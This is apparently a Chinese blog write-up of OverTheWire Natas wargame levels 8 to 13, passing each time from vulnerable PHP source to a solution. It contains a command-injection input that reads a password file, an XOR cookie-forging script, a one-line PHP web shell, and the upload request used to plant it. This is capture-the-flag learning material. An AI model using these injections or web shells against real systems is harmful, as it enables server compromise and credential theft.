+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line">$encodedSecret = <span class="string">"3d3d516343746d4d6d6c315669563362"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encodeSecret</span><span class="params">($secret)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bin2hex(strrev(base64_encode($secret)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"submit"</span>, $_POST)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(encodeSecret($_POST[<span class="string">'secret'</span>]) == $encodedSecret) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Access granted. The password for natas9 is &lt;censored&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Wrong secret"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>提交的参数经过三次处理后等于<code>$encodedSecret</code>就会获得密码</p>
+<p>bin2hex()函数是把 ASCII 字符的字符串转换为十六进制值<br>strrev()函数是反转字符串<br>base64_encode()进行Base64编码</p>
+<p>那个就写一个脚本还原<code>$encodedSecret</code>的值，代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$data = <span class="string">"3d3d516343746d4d6d6c315669563362"</span>;</span><br><span class="line">$result =base64_decode(strrev(hex2bin($data)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $result</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>提交运行的结果获得密码</p>
+<p>The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</p>
+<h2 id="Natas-Level-8-→-Level-9"><a href="#Natas-Level-8-→-Level-9" class="headerlink" title="Natas Level 8 → Level 9"></a>Natas Level 8 → Level 9</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: natas9</span><br><span class="line">URL:      http://natas9.natas.labs.overthewire.org</span><br><span class="line"></span><br><span class="line">密码：W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$key = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"needle"</span>, $_REQUEST)) &#123;</span><br><span class="line">    $key = $_REQUEST[<span class="string">"needle"</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($key != <span class="string">""</span>) &#123;</span><br><span class="line">    passthru(<span class="string">"grep -i $key dictionary.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过passthru()来执行外部命令，可以使用<code>;</code>命令分隔符，这将允许我们在一行中使用2个命令。我们还将使用<code>#</code>注释命令，它将注释符号后面的其余文本。</p>
+<p>因此输入<code>; cat /etc/natas_webpass/natas10 #</code>将运行passthru命令<code>; grep -i ; cat /etc/natas_webpass/natas10 #</code>并注释掉dictionary.txt。</p>
+<p>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</p>
+<h2 id="Natas-Level-9-→-Level-10"><a href="#Natas-Level-9-→-Level-10" class="headerlink" title="Natas Level 9 → Level 10"></a>Natas Level 9 → Level 10</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: natas10</span><br><span class="line">URL:      http://natas10.natas.labs.overthewire.org</span><br><span class="line"></span><br><span class="line">密码：nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<p>感觉套路一样，只是说过滤了某些字符，还是查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$key = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"needle"</span>, $_REQUEST)) &#123;</span><br><span class="line">    $key = $_REQUEST[<span class="string">"needle"</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($key != <span class="string">""</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/[;|&amp;]/'</span>,$key)) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Input contains an illegal character!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        passthru(<span class="string">"grep -i $key dictionary.txt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>过滤了<code>；</code>和<code>&amp;</code>，那就想办法绕过，使用<code>.* /etc/natas_webpass/natas11 #</code>，<code>.#</code>意思是通过grep搜索所有，并将其匹配到 <code>/etc/natas_webpass/natas11</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Output:</span><br><span class="line">.htaccess:AuthType Basic</span><br><span class="line">.htaccess: AuthName &quot;Authentication required&quot;</span><br><span class="line">.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd</span><br><span class="line">.htaccess: require valid-user</span><br><span class="line">.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0</span><br><span class="line">/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</span><br></pre></td></tr></table></figure>
+<p>natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</p>
+<h2 id="Natas-Level-10-→-Level-11"><a href="#Natas-Level-10-→-Level-11" class="headerlink" title="Natas Level 10 → Level 11"></a>Natas Level 10 → Level 11</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: natas11</span><br><span class="line">URL:      http://natas11.natas.labs.overthewire.org</span><br><span class="line"></span><br><span class="line">密码：U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<p>还是之接看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line">$defaultdata = <span class="keyword">array</span>( <span class="string">"showpassword"</span>=&gt;<span class="string">"no"</span>, <span class="string">"bgcolor"</span>=&gt;<span class="string">"#ffffff"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_encrypt</span><span class="params">($in)</span> </span>&#123;</span><br><span class="line">    $key = <span class="string">'&lt;censored&gt;'</span>;</span><br><span class="line">    $text = $in;</span><br><span class="line">    $outText = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Iterate through each character</span></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($text);$i++) &#123;</span><br><span class="line">    $outText .= $text[$i] ^ $key[$i % strlen($key)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $outText;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($def)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_COOKIE;</span><br><span class="line">    $mydata = $def;</span><br><span class="line">    <span class="keyword">if</span>(array_key_exists(<span class="string">"data"</span>, $_COOKIE)) &#123;</span><br><span class="line">    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[<span class="string">"data"</span>])), <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(is_array($tempdata) &amp;&amp; array_key_exists(<span class="string">"showpassword"</span>, $tempdata) &amp;&amp; array_key_exists(<span class="string">"bgcolor"</span>, $tempdata)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/^#(?:[a-f\d]&#123;6&#125;)$/i'</span>, $tempdata[<span class="string">'bgcolor'</span>])) &#123;</span><br><span class="line">        $mydata[<span class="string">'showpassword'</span>] = $tempdata[<span class="string">'showpassword'</span>];</span><br><span class="line">        $mydata[<span class="string">'bgcolor'</span>] = $tempdata[<span class="string">'bgcolor'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $mydata;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveData</span><span class="params">($d)</span> </span>&#123;</span><br><span class="line">    setcookie(<span class="string">"data"</span>, base64_encode(xor_encrypt(json_encode($d))));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = loadData($defaultdata);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"bgcolor"</span>,$_REQUEST)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^#(?:[a-f\d]&#123;6&#125;)$/i'</span>, $_REQUEST[<span class="string">'bgcolor'</span>])) &#123;</span><br><span class="line">        $data[<span class="string">'bgcolor'</span>] = $_REQUEST[<span class="string">'bgcolor'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">saveData($data);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;natas11&lt;/h1&gt;</span><br><span class="line">&lt;div id=<span class="string">"content"</span>&gt;</span><br><span class="line">&lt;body style=<span class="string">"background: &lt;?=$data['bgcolor']?&gt;;"</span>&gt;</span><br><span class="line">Cookies are <span class="keyword">protected</span> with <span class="keyword">XOR</span> encryption&lt;br/&gt;&lt;br/&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">if</span>($data[<span class="string">"showpassword"</span>] == <span class="string">"yes"</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"The password for natas12 is &lt;censored&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>首先定义了一个数组，然后创建了一个’xor_encrypt’函数,该函数将一个字符串作为输入并使用一个经过审查的密钥执行XOR操作 ;’loadData’函数，将默认数组加载到$ mydata中，检查cookie中是否存在数据，如果是，则尝试对其进行base64_decode，对其执行XOR操作，并将JSON解码为数组 ,如果这确实是一个数组，并且找到适当的值，则使用cookie中的值更新mydata的值 ,如果不是，则保留默认值;’saveData’函数，该函数用于将Cookie设置为JSON编码，异或，然后base64编码的数据.</p>
+<p>XOR加密的特性 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Original_Data XOR KEY = Encrypted_Data</span><br><span class="line"></span><br><span class="line">Original_Data XOR Encrypted_Data = KEY</span><br></pre></td></tr></table></figure>
+<p>所以使用这个特性写一个脚本来算出KEY，Cookie=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;php?  </span><br><span class="line"> $cookie = base64_decode(<span class="string">'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw'</span>);  </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">xor_encrypt</span><span class="params">($in)</span> </span>&#123;  </span><br><span class="line">   $text = $in;  </span><br><span class="line">   $key = json_encode(<span class="keyword">array</span>( <span class="string">"showpassword"</span>=&gt;<span class="string">"no"</span>, <span class="string">"bgcolor"</span>=&gt;<span class="string">"#ffffff"</span>));  </span><br><span class="line">   $outText = <span class="string">''</span>;  </span><br><span class="line">   <span class="comment">// Iterate through each character  </span></span><br><span class="line">   <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($text);$i++) &#123;  </span><br><span class="line">   $outText .= $text[$i] ^ $key[$i % strlen($key)];  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="keyword">return</span> $outText;  </span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="keyword">print</span> xor_encrypt($cookie);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行结果为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</span><br></pre></td></tr></table></figure>
+<p>所以key为qw8J，接着再写算出以<code>qw8J</code>为密钥，’showpassword’的值为’yes’ 的密文</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_encrypt</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $text = json_encode(<span class="keyword">array</span>( <span class="string">"showpassword"</span>=&gt;<span class="string">"yes"</span>, <span class="string">"bgcolor"</span>=&gt;<span class="string">"#ffffff"</span>));</span><br><span class="line">    $key = <span class="string">"qw8J"</span>;</span><br><span class="line">    $outText = <span class="string">''</span>;</span><br><span class="line">    <span class="comment">// Iterate through each character</span></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($text);$i++) &#123;</span><br><span class="line">        $outText .= $text[$i] ^ $key[$i % strlen($key)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $outText;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> base64_encode(xor_encrypt());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行结果为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</span><br></pre></td></tr></table></figure>
+<p>最后使用Burp suite抓包修改Cookie为刚得到的获得密码</p>
+<p>The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</p>
+<h2 id="Natas-Level-11-→-Level-12"><a href="#Natas-Level-11-→-Level-12" class="headerlink" title="Natas Level 11 → Level 12"></a>Natas Level 11 → Level 12</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: natas12</span><br><span class="line">URL:      http://natas12.natas.labs.overthewire.org</span><br><span class="line"></span><br><span class="line">密码：EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<p>同样先看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">genRandomString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $length = <span class="number">10</span>;</span><br><span class="line">    $characters = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz"</span>;</span><br><span class="line">    $string = <span class="string">""</span>;    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($p = <span class="number">0</span>; $p &lt; $length; $p++) &#123;</span><br><span class="line">        $string .= $characters[mt_rand(<span class="number">0</span>, strlen($characters)<span class="number">-1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPath</span><span class="params">($dir, $ext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">    $path = $dir.<span class="string">"/"</span>.genRandomString().<span class="string">"."</span>.$ext;</span><br><span class="line">    &#125; <span class="keyword">while</span>(file_exists($path));</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPathFromFilename</span><span class="params">($dir, $fn)</span> </span>&#123;</span><br><span class="line">    $ext = pathinfo($fn, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">return</span> makeRandomPath($dir, $ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"filename"</span>, $_POST)) &#123;</span><br><span class="line">    $target_path = makeRandomPathFromFilename(<span class="string">"upload"</span>, $_POST[<span class="string">"filename"</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(filesize($_FILES[<span class="string">'uploadedfile'</span>][<span class="string">'tmp_name'</span>]) &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is too big"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'uploadedfile'</span>][<span class="string">'tmp_name'</span>], $target_path)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"The file &lt;a href=\"$target_path\"&gt;$target_path&lt;/a&gt; has been uploaded"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"There was an error uploading the file, please try again!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"1000"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"filename"</span> value=<span class="string">"&lt;? print genRandomString(); ?&gt;.jpg"</span> /&gt;</span><br><span class="line">Choose a JPEG to upload (max <span class="number">1</span>KB):&lt;br/&gt;</span><br><span class="line">&lt;input name=<span class="string">"uploadedfile"</span> type=<span class="string">"file"</span> /&gt;&lt;br /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Upload File"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>genRandomString函数创建一个10个字符的随机字符串 ；</p>
+<p>makeRandomPath函数传入一个目录和扩展名，并创建一个随机文件名；</p>
+<p>makeRandomPathFromFilename函数，它接收一个目录和一个文件名，并从文件名中提取扩展名。然后它使用这个信息来调用makeRandomPath；</p>
+<p>然后PHP代码检查是否已上传文件，然后从提供的文件名创建一个随机路径。然后它会检查大小以确保其大小不超过1000字节，如果这些检查通过，它会上传文件并告诉路径</p>
+<p>我先正常上传了一个正常的小于1K的图片，成功返回了路径和重命名后的文件名。于是上传一个shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>    </span><br><span class="line">passthru($_GET[<span class="string">'cmd'</span>]);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>修该扩展名为jpg，使用burp suite 抓包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: natas12.natas.labs.overthewire.org</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: http://natas12.natas.labs.overthewire.org/</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------27523163275597</span><br><span class="line">Content-Length: 454</span><br><span class="line">Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------27523163275597</span><br><span class="line">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">1000</span><br><span class="line">-----------------------------27523163275597</span><br><span class="line">Content-Disposition: form-data; name=&quot;filename&quot;</span><br><span class="line"></span><br><span class="line">4flu9u53ae.jpg</span><br><span class="line">-----------------------------27523163275597</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploadedfile&quot;; filename=&quot;2.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line"> &lt;?    </span><br><span class="line"> passthru($_GET[&apos;cmd&apos;]);  </span><br><span class="line"> ?&gt;  </span><br><span class="line">-----------------------------27523163275597--</span><br></pre></td></tr></table></figure>
+<p>修改filename的扩展名，将<code>jpg</code>改为<code>php</code></p>
+<p><code>4flu9u53ae.php</code></p>
+<p>返回：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The file upload/d0tmjn54an.php has been uploaded</span><br></pre></td></tr></table></figure>
+<p>shell上传成功，接着执行命令<code>cat  /etc/natas_webpass/natas13</code>查看密码</p>
+<p>访问：natas12.natas.labs.overthewire.org/upload/d0tmjn54an.php?cmd=cat /etc/natas_webpass/natas13</p>
+<p>获得密码</p>
+<p>jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY </p>
+<h2 id="Natas-Level-12-→-Level-13"><a href="#Natas-Level-12-→-Level-13" class="headerlink" title="Natas Level 12 → Level 13"></a>Natas Level 12 → Level 13</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: natas13</span><br><span class="line">URL:      http://natas13.natas.labs.overthewire.org</span><br><span class="line"></span><br><span class="line">密码：jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<p>这里就不把源码复制过来了，这题不同的是用了exif_imagetype 函数来获取图片的类型。大多数文件类型（如JPEG，ZIP，TAR等）在文件的开头都有一个“ Magic Number ”来帮助验证它的文件类型。因此，要通过exif_imagetype函数检查，我们的文件必须以支持的图像格式的幻数开始。</p>
+<p> jpeg文件有固定的文件头，其文件头的格式如下： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Start Marker  | JFIF Marker | Header Length | Identifier</span><br><span class="line"> </span><br><span class="line">0xff, 0xd8    | 0xff, 0xe0  |    2-bytes    | &quot;JFIF\0&quot;</span><br></pre></td></tr></table></figure>
+<p>用python创建一个shell脚本</p>
